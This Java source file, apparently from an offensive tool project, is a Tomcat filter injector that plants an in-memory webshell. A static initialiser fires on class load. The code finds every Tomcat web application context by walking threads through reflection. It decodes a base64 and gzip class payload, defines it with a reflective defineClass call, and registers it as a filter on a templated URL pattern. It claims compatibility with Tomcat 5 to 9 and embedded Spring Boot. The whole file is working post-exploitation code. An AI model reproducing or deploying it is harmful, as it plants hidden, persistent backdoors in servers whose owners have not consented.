package com.reajason.javaweb.memshell.tomcat.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * Date: 2022/11/01
 * Author: pen4uin
 * Description: Tomcat Filter 注入器 Tested version： jdk v1.8.0_275
 * tomcat v5.5.36, v6.0.9, v7.0.32, v8.5.83, v9.0.67
 *
 * @author ReaJason
 */
public class TomcatFilterInjector {

    static {
        new TomcatFilterInjector();
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public TomcatFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getShell(context);
                inject(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
        Object context = null;
        for (Thread thread : threads) {
            // 适配 v5/v6/7/8
            if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                // 原: map.get("localhost")
                // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
                for (Object key : childrenMap.keySet()) {
                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(childrenMap.get(key), "children");
                    // 原: context = children.get("");
                    // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
                    for (Object key1 : children.keySet()) {
                        context = children.get(key1);
                        if (context != null && context.getClass().getName().contains("StandardContext")) {
                            contexts.add(context);
                        }
                        // 兼容 spring boot 2.x embedded tomcat
                        if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                            contexts.add(context);
                        }
                    }
                }
            }
            // 适配 tomcat v9
            else if (thread.getContextClassLoader() != null
                    && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader")
                    || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                context = getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context");
                if (context != null && context.getClass().getName().contains("StandardContext")) {
                    contexts.add(context);
                }
                if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                    contexts.add(context);
                }
            }
        }
        return contexts;
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        Object obj;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            obj = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            obj = clazz.newInstance();
        }
        return obj;
    }

    public boolean isInjected(Object context) throws Exception {
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            System.out.println("filter already injected");
            return true;
        }
        return false;
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object filter) throws Exception {
        if (isInjected(context)) {
            return;
        }
        String filterClassName = getClassName();
        Object filterDef;
        Object filterMap;
        try {
            // tomcat v8/9
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception e2) {
            // tomcat v6/7
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception e) {
                // tomcat v5
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, context.getClass().getClassLoader()).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, context.getClass().getClassLoader()).newInstance();
            }
        }
        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
        invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
        invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
        Constructor<?>[] constructors;
        try {
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
        } catch (Exception e) {
            // tomcat v5
            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, context.getClass().getClassLoader()).getDeclaredConstructors();
        }
        try {
            // v7.0.0 以上
            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
        } catch (Exception e) {
            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
        }
        System.out.println("filter inject success");
        constructors[0].setAccessible(true);
        try {
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
            filterConfigs.put(filterClassName, filterConfig);
        } catch (Exception e) {
            // 一个 tomcat 多个应用部分应用通过上下文线程加载 filter 对象，可能在目标应用会加载不到
            if (!(e.getCause() instanceof ClassNotFoundException)) {
                throw e;
            }
        }
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }
}